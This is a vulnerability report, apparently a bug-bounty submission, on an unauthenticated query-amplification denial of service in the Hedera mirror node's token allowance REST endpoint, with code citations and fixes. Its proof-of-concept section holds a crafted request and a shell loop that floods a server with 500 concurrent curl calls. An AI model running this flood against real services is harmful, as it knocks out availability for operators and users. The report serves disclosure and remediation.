### Title
Unauthenticated 3-Way UNION ALL Query Amplification DoS on Token Allowance Endpoint

### Summary
Any unauthenticated external user can craft a single HTTP GET request to `/api/v1/accounts/:id/allowances/tokens` with `spender.id` and `token.id` range filters that causes `extractTokenMultiUnionQuery()` to produce a three-way UNION ALL query, each branch independently scanning the `token_allowance` table. The REST API has no per-IP or global rate limiting, so an attacker can flood the database connection pool with these amplified queries, degrading the mirror node's ability to ingest record stream data from the network.

### Finding Description

**Exact code path:**

`rest/routes/accountRoute.js` line 18 registers the route with no authentication guard: [1](#0-0) 

`rest/controllers/tokenAllowanceController.js` `getAccountTokenAllowances` (lines 68–81) calls `extractTokenMultiUnionQuery` with attacker-controlled filters, then immediately executes the resulting query: [2](#0-1) 

`extractTokenMultiUnionQuery` (lines 22–60) builds `lower`, `inner`, and `upper` filter sets from the request parameters: [3](#0-2) 

`rest/service/tokenAllowanceService.js` `getQuery` (lines 63–74) emits a three-branch UNION ALL when all three filter sets are non-empty: [4](#0-3) 

**Root cause:** When a request supplies both a lower and upper bound for `spender.id` (e.g. `gte:1` and `lte:9999999999`) together with both a lower and upper bound for `token.id`, `getLowerFilters`, `getInnerFilters`, and `getUpperFilters` all return non-empty arrays. The service then wraps each in a separate `SELECT … FROM token_allowance WHERE owner=$1 AND amount>0 AND spender … ORDER BY spender,token_id LIMIT $2` subquery joined by `UNION ALL`. The outer query adds another `ORDER BY … LIMIT $2`. This is 3 independent table/index scans per HTTP request.

**Why existing checks are insufficient:**

- `authHandler` (`rest/middleware/authHandler.js` lines 15–36) only sets a custom response-row limit for authenticated users; it does **not** block or throttle unauthenticated requests: [5](#0-4) 

- `maxRepeatedQueryParameters` (enforced in `requestHandler.js` via `qs` `arrayLimit`) prevents a single parameter from being repeated more than N times, but the 3-way UNION ALL requires only **two** values for `spender.id` and **two** for `token.id` — well within any reasonable limit: [6](#0-5) 

- The REST API has **no** rate-limiting middleware (the `ThrottleManager` found in the codebase is scoped exclusively to the `web3` module's contract-call endpoint, not the REST API): [7](#0-6) 

- `validateBounds` only rejects logically invalid combinations (ne, mixed range+equal, missing primary); a valid closed range on both dimensions passes all checks: [8](#0-7) 

### Impact Explanation
Each crafted request consumes three database connections/slots for the duration of the query. The inner subquery (`spender > $5 AND spender < $6`) with a maximally wide range forces a full index scan over all of the owner's token allowances before the `LIMIT` is applied. Flooding the endpoint with concurrent requests exhausts the DB connection pool (`maxConnections`), causing legitimate queries — including those used by the mirror node's record-stream ingestion pipeline — to queue or time out. This degrades or halts transaction ingestion from the Hedera network, constituting a service-availability impact.

### Likelihood Explanation
The preconditions are zero: no account, no API key, no privileged access. The trigger is a single HTTP GET with four query parameters. The attack is trivially scriptable, repeatable at arbitrary concurrency, and requires no knowledge of valid account IDs (any existing account ID works; even a non-existent one only fails after the DB query fires). The 3x query amplification per request makes the attack more efficient than a plain request flood.

### Recommendation
1. **Add rate limiting to the REST API** (e.g., express-rate-limit or a reverse-proxy rule) scoped per source IP, applied before route handlers.
2. **Add a DB-level statement timeout** specific to REST API queries (if not already set to a low value) to bound the duration of each scan.
3. **Require the `owner` account to exist before executing the UNION ALL** — the `EntityService.getEncodedId` call already does a lookup, but it should short-circuit before query generation if the account has no allowances.
4. **Consider capping the UNION ALL to a single query path** when the spender range is unbounded (i.e., collapse the three-branch form into the simpler single-scan form when no secondary bound is present).

### Proof of Concept
```
# Trigger a 3-way UNION ALL with maximally wide ranges (no auth required):
GET /api/v1/accounts/0.0.1/allowances/tokens?spender.id=gte:1&spender.id=lte:9999999999&token.id=gte:1&token.id=lte:9999999999

# Generated SQL (from tokenAllowanceService.getQuery):
(select * from token_allowance
   where owner = $1 and amount > 0 and spender = $3 and token_id >= $4
   order by spender asc, token_id asc limit $2)
union all
(select * from token_allowance
   where owner = $1 and amount > 0 and spender > $5 and spender < $6
   order by spender asc, token_id asc limit $2)
union all
(select * from token_allowance
   where owner = $1 and amount > 0 and spender = $7 and token_id <= $8
   order by spender asc, token_id asc limit $2)
order by spender asc, token_id asc limit $2

# Flood with concurrent requests to exhaust the DB pool:
for i in $(seq 1 500); do
  curl -s "http://<mirror-node>/api/v1/accounts/0.0.1/allowances/tokens?spender.id=gte:1&spender.id=lte:9999999999&token.id=gte:1&token.id=lte:9999999999" &
done
wait
```

### Citations

**File:** rest/routes/accountRoute.js (L18-18)
```javascript
router.getExt(getPath('allowances/tokens'), TokenAllowanceController.getAccountTokenAllowances);
```

**File:** rest/controllers/tokenAllowanceController.js (L22-60)
```javascript
  extractTokenMultiUnionQuery(filters, ownerAccountId) {
    const bounds = {
      primary: new Bound(filterKeys.SPENDER_ID, 'spender'),
      secondary: new Bound(filterKeys.TOKEN_ID, 'token_id'),
    };
    let limit = defaultLimit;
    let order = orderFilterValues.ASC;

    for (const filter of filters) {
      switch (filter.key) {
        case filterKeys.SPENDER_ID:
          bounds.primary.parse(filter);
          break;
        case filterKeys.TOKEN_ID:
          bounds.secondary.parse(filter);
          break;
        case filterKeys.LIMIT:
          limit = filter.value;
          break;
        case filterKeys.ORDER:
          order = filter.value;
          break;
        default:
          break;
      }
    }

    this.validateBounds(bounds);

    return {
      bounds,
      lower: this.getLowerFilters(bounds),
      inner: this.getInnerFilters(bounds),
      upper: this.getUpperFilters(bounds),
      order,
      ownerAccountId,
      limit,
    };
  }
```

**File:** rest/controllers/tokenAllowanceController.js (L68-81)
```javascript
  getAccountTokenAllowances = async (req, res) => {
    const accountId = await EntityService.getEncodedId(req.params[filterKeys.ID_OR_ALIAS_OR_EVM_ADDRESS]);
    const filters = utils.buildAndValidateFilters(req.query, acceptedTokenAllowanceParameters);
    const query = this.extractTokenMultiUnionQuery(filters, accountId);
    const tokenAllowances = await TokenAllowanceService.getAccountTokenAllowances(query);
    const allowances = tokenAllowances.map((model) => new TokenAllowanceViewModel(model));

    res.locals[responseDataLabel] = {
      allowances,
      links: {
        next: this.getPaginationLink(req, allowances, query.bounds, query.limit, query.order),
      },
    };
  };
```

**File:** rest/service/tokenAllowanceService.js (L63-75)
```javascript
    const subQueries = [lower, inner, upper]
      .filter((filters) => filters.length !== 0)
      .map((filters) => this.getSubQuery(filters, params, accountIdCondition, limitClause, orderClause));

    let sqlQuery;
    if (subQueries.length === 0) {
      // if all three filters are empty, the subqueries will be empty too, just create the query with empty filters
      sqlQuery = this.getSubQuery([], params, accountIdCondition, limitClause, orderClause);
    } else if (subQueries.length === 1) {
      sqlQuery = subQueries[0];
    } else {
      sqlQuery = [subQueries.map((q) => `(${q})`).join('\nunion all\n'), orderClause, limitClause].join('\n');
    }
```

**File:** rest/middleware/authHandler.js (L15-36)
```javascript
const authHandler = async (req, res) => {
  const credentials = basicAuth(req);

  if (!credentials) {
    return;
  }

  const user = findUser(credentials.name, credentials.pass);
  if (!user) {
    res.status(httpStatusCodes.UNAUTHORIZED.code).json({
      _status: {
        messages: [{message: 'Invalid credentials'}],
      },
    });
    return;
  }

  if (user.limit !== undefined && user.limit > 0) {
    httpContext.set(userLimitLabel, user.limit);
    logger.debug(`Authenticated user ${user.username} with custom limit ${user.limit}`);
  }
};
```

**File:** rest/middleware/requestHandler.js (L15-20)
```javascript
const queryOptions = {
  arrayLimit: config.query.maxRepeatedQueryParameters,
  depth: 1,
  strictDepth: true,
  throwOnLimitExceeded: true,
};
```

**File:** rest/server.js (L85-92)
```javascript
// authentication middleware - must come after httpContext and requestLogger
app.useExt(authHandler);

// metrics middleware
if (config.metrics.enabled) {
  const {metricsHandler} = await import('./middleware/metricsHandler');
  app.useExt(metricsHandler());
}
```

**File:** rest/controllers/baseController.js (L56-123)
```javascript
  validateBounds(bounds) {
    this.validateBoundsRange(bounds);
    this.validateSecondaryBound(bounds);
    this.validateLowerBounds(bounds);
    this.validateUpperBounds(bounds);
  }

  /**
   * Validate that if the primary bound is empty the secondary bound is empty as well.
   *
   * @param {Bound}[] bounds
   * @throws {InvalidArgumentError}
   */
  validateSecondaryBound(bounds) {
    if (bounds.primary.isEmpty() && !bounds.secondary.isEmpty()) {
      throw new InvalidArgumentError(
        `${bounds.secondary.filterKey} without a ${bounds.primary.filterKey} parameter filter`
      );
    }
  }

  /**
   * Validate that the Lower Bounds are valid.
   *
   * @param {Bound}[] bounds
   * @throws {InvalidArgumentError}
   */
  validateLowerBounds(bounds) {
    const {primary, secondary} = bounds;
    if (
      !primary.hasEqual() &&
      secondary.hasLower() &&
      (!primary.hasLower() || primary.lower.operator === utils.opsMap.gt)
    ) {
      throw new InvalidArgumentError(`${primary.filterKey} must have gte or eq operator`);
    }
  }

  /**
   * Validate that the Upper Bounds are valid.
   *
   * @param {Bound}[] bounds
   * @throws {InvalidArgumentError}
   */
  validateUpperBounds(bounds) {
    const {primary, secondary} = bounds;
    if (
      !primary.hasEqual() &&
      secondary.hasUpper() &&
      (!primary.hasUpper() || primary.upper.operator === utils.opsMap.lt)
    ) {
      throw new InvalidArgumentError(`${primary.filterKey} must have lte or eq operator`);
    }
  }

  /**
   * Validate the bound range and equal combination
   *
   * @param {Bound}[] bounds
   * @throws {InvalidArgumentError}
   */
  validateBoundsRange(bounds) {
    Object.keys(bounds).forEach((key) => {
      if (bounds[key].hasBound() && bounds[key].hasEqual()) {
        throw new InvalidArgumentError(`Can't support both range and equal for ${bounds[key].filterKey}`);
      }
    });
  }
```
